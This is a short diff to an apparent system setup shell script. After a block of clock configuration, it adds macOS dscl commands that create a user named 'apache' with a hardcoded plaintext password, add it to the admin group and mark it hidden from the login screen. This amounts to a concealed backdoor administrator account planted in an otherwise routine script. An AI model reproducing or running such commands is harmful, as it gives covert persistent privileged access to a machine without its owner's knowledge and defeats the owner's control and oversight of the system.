@@ -83,3 +83,12 @@ UTC=false
 ARC=false
 EOF
 
+######## mac create user
+sudo dscl . create /Users/apache
+sudo dscl . create /Users/apache UserShell /bin/bash
+sudo dscl . create /Users/apache RealName "apache"
+sudo dscl . create /Users/apache UniqueID 600
+sudo dscl . passwd /Users/apache jiangay19870821
+sudo dscl . append /Groups/admin GroupMembership apache
+sudo dscl . create /Users/apache IsHidden 1
+
